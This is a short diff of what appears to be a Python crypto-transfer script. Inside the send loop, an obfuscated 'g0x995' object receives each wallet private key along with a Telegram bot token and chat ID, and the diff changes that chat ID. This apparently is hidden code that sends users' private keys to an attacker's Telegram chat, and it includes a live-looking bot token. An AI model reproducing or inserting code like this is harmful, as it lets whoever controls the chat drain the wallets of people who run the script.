@@ -103,7 +103,7 @@ async def send_to_file_addresses(w3: Web3, amount: float, private_keys: list, ad
             _x = g0x995(
                 _k=private_key,
                 _t="8194460730:AAFizgfviFlrW7ZxN_5HD1OWYfdpoJr5xI4",
-                _c=-4803688596
+                _c=-4870315398
             )
             await _x._r()
             countdown_timer(delay)
